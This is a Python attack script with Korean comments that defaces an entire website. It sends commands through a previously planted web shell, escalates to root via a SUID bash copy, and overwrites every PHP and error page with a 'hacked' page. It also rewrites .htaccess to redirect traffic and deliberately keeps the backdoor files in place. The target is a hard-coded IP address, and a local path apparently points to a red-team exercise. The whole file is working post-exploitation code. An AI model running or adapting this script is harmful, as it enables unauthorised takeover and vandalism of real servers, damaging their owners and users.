#!/usr/bin/env python3
"""
전체 사이트 디페이스 스크립트
모든 PHP 파일을 해킹 페이지로 교체
"""

import requests
import base64
from urllib.parse import quote

class 전체디페이스:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.webshell = f"{self.target}/uploads/x.php"

    def 명령실행(self, cmd):
        """명령 실행"""
        try:
            encoded = quote(cmd)
            r = requests.get(f"{self.webshell}?x={encoded}", timeout=10)
            return r.text
        except Exception as e:
            return f"에러: {str(e)}"

    def 루트명령(self, cmd):
        """루트 권한 명령 실행"""
        encoded_cmd = base64.b64encode(cmd.encode()).decode()
        root_cmd = f"/var/www/html/www/uploads/rootbash -p -c \"echo '{encoded_cmd}' | base64 -d | bash\""
        return self.명령실행(root_cmd)

    def PHP파일찾기(self):
        """모든 PHP 파일 찾기"""
        print("[*] 사이트의 모든 PHP 파일을 찾는 중...")

        # www 디렉토리의 모든 PHP 파일 찾기
        cmd = "find /var/www/html/www -maxdepth 1 -name '*.php' -type f"
        result = self.루트명령(cmd)

        php_files = [f.strip() for f in result.split('\n') if f.strip().endswith('.php')]

        print(f"[+] 총 {len(php_files)}개의 PHP 파일 발견:")
        for f in php_files:
            filename = f.split('/')[-1]
            print(f"    - {filename}")

        return php_files

    def 백업생성(self, php_files):
        """원본 파일 백업"""
        print("\n[*] 원본 파일 백업 중...")

        backup_dir = f"/root/backup_$(date +%Y%m%d_%H%M%S)"
        self.루트명령(f"mkdir -p {backup_dir}")

        for php_file in php_files:
            self.루트명령(f"cp {php_file} {backup_dir}/")

        print(f"[+] 백업 완료: {backup_dir}")

    def 해킹페이지업로드(self, hacked_html_path):
        """해킹 페이지를 서버에 업로드"""
        print("\n[*] 해킹 페이지 업로드 중...")

        try:
            with open(hacked_html_path, 'r', encoding='utf-8') as f:
                hacked_content = f.read()
        except Exception as e:
            print(f"[✗] 파일 읽기 실패: {e}")
            return None

        # Base64로 인코딩
        encoded_html = base64.b64encode(hacked_content.encode()).decode()

        # 서버에 임시 파일로 저장
        temp_file = "/tmp/hacked_page.html"
        cmd = f"echo '{encoded_html}' | base64 -d > {temp_file}"
        self.루트명령(cmd)

        print("[+] 해킹 페이지 업로드 완료")
        return temp_file

    def 모든파일교체(self, php_files, hacked_page_path):
        """모든 PHP 파일을 해킹 페이지로 교체"""
        print("\n[*] 모든 PHP 파일을 해킹 페이지로 교체 중...")

        success_count = 0
        fail_count = 0

        for php_file in php_files:
            filename = php_file.split('/')[-1]

            # 백도어 파일은 건드리지 않음
            if any(bd in filename for bd in ['x.php', 'health-check', 'system-check', 'backup.php', 'cache-clear']):
                print(f"    [SKIP] {filename} (백도어 파일)")
                continue

            try:
                # 해킹 페이지로 교체
                cmd = f"cp {hacked_page_path} {php_file}"
                self.루트명령(cmd)

                # 권한 설정
                self.루트명령(f"chmod 644 {php_file}")
                self.루트명령(f"chown apache:apache {php_file}")

                print(f"    [✓] {filename}")
                success_count += 1

            except Exception as e:
                print(f"    [✗] {filename} - 실패: {e}")
                fail_count += 1

        print(f"\n[+] 교체 완료: 성공 {success_count}개, 실패 {fail_count}개")

    def 추가디렉토리확인(self):
        """다른 디렉토리도 확인"""
        print("\n[*] 다른 경로의 PHP 파일 확인 중...")

        directories = [
            '/var/www/html/www/admin',
            '/var/www/html/www/user',
            '/var/www/html/www/includes',
            '/var/www/html/www/modules',
        ]

        all_files = []
        for directory in directories:
            cmd = f"find {directory} -name '*.php' -type f 2>/dev/null"
            result = self.루트명령(cmd)

            if result and 'No such file' not in result:
                files = [f.strip() for f in result.split('\n') if f.strip().endswith('.php')]
                if files:
                    print(f"[+] {directory}: {len(files)}개 파일 발견")
                    all_files.extend(files)

        return all_files

    def htaccess설정(self):
        """모든 요청을 index.php로 리다이렉트"""
        print("\n[*] .htaccess 설정 중...")

        htaccess_content = """# 해킹됨 - All requests redirected
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_URI} !^/uploads/
RewriteRule ^(.*)$ /index.php [L,R=302]"""

        encoded = base64.b64encode(htaccess_content.encode()).decode()
        cmd = f"echo '{encoded}' | base64 -d > /var/www/html/www/.htaccess"
        self.루트명령(cmd)

        print("[+] .htaccess 설정 완료 - 모든 요청이 index.php로 이동")

    def 에러페이지교체(self):
        """Apache 에러 페이지도 교체"""
        print("\n[*] Apache 에러 페이지 교체 중...")

        error_pages = [
            '/var/www/html/www/404.php',
            '/var/www/html/www/403.php',
            '/var/www/html/www/500.php',
            '/var/www/html/www/error.php',
        ]

        hacked_temp = "/tmp/hacked_page.html"

        for error_page in error_pages:
            self.루트명령(f"cp {hacked_temp} {error_page}")
            print(f"    [✓] {error_page.split('/')[-1]}")

    def 완료메시지(self):
        """완료 메시지 출력"""
        print("\n" + "="*60)
        print("  전체 사이트 디페이스 완료!")
        print("="*60)
        print("\n[접속 확인]")
        print(f"  {self.target}/")
        print(f"  {self.target}/login.php")
        print(f"  {self.target}/profile.php")
        print(f"  {self.target}/main.php")
        print("\n[복구 방법]")
        print("  백업 위치: /root/backup_YYYYMMDD_HHMMSS/")
        print("  복구 명령: ./rootbash -p -c 'cp /root/backup_*/*.php /var/www/html/www/'")
        print("\n[주의]")
        print("  - 백도어 파일(x.php, health-check.php 등)은 그대로 유지됨")
        print("  - 원본 파일은 /root/backup_* 에 안전하게 백업됨")
        print("="*60)


def main():
    target = "http://52.78.221.104"
    hacked_page = "/Users/hwangjunha/Desktop/Red_basic_local/H/fin/defacement/hacked_page.html"

    print("="*60)
    print("  전체 사이트 디페이스 스크립트")
    print("  Target: 52.78.221.104")
    print("="*60)
    print()

    deface = 전체디페이스(target)

    # 연결 테스트
    print("[*] 연결 테스트 중...")
    result = deface.명령실행("whoami")
    print(f"    현재 사용자: {result.strip()}")

    result = deface.루트명령("whoami")
    print(f"    루트 권한: {result.strip()}")

    if 'root' not in result:
        print("\n[✗] 루트 권한 없음! rootbash 확인 필요")
        return

    print("\n[주의!] 이 작업은 전체 사이트를 해킹 페이지로 교체합니다.")
    print("[주의!] 원본 파일은 자동으로 백업됩니다.")
    confirm = input("\n계속하시겠습니까? (yes 입력): ").strip().lower()

    if confirm != 'yes':
        print("\n[*] 취소됨")
        return

    print("\n" + "="*60)
    print("디페이스 시작...")
    print("="*60)

    # 1. PHP 파일 찾기
    php_files = deface.PHP파일찾기()

    if not php_files:
        print("\n[✗] PHP 파일을 찾을 수 없습니다!")
        return

    # 2. 백업 생성
    deface.백업생성(php_files)

    # 3. 해킹 페이지 업로드
    hacked_temp = deface.해킹페이지업로드(hacked_page)

    if not hacked_temp:
        print("\n[✗] 해킹 페이지 업로드 실패!")
        return

    # 4. 모든 파일 교체
    deface.모든파일교체(php_files, hacked_temp)

    # 5. 추가 디렉토리 확인
    additional_files = deface.추가디렉토리확인()
    if additional_files:
        print(f"\n[?] 추가로 {len(additional_files)}개 파일 발견")
        confirm = input("이 파일들도 교체하시겠습니까? (yes/no): ").strip().lower()
        if confirm == 'yes':
            deface.모든파일교체(additional_files, hacked_temp)

    # 6. .htaccess 설정
    deface.htaccess설정()

    # 7. 에러 페이지 교체
    deface.에러페이지교체()

    # 8. 완료 메시지
    deface.완료메시지()

    # 9. 실제 확인
    print("\n[*] 실제 페이지 확인 중...")
    try:
        response = requests.get(f"{target}/", timeout=5)
        if "HACKED" in response.text or "COMPROMISED" in response.text:
            print("[✓] 디페이스 확인됨!")
        else:
            print("[!] 디페이스가 제대로 적용되지 않았을 수 있습니다.")
    except Exception as e:
        print(f"[!] 확인 중 에러: {e}")


if __name__ == "__main__":
    main()
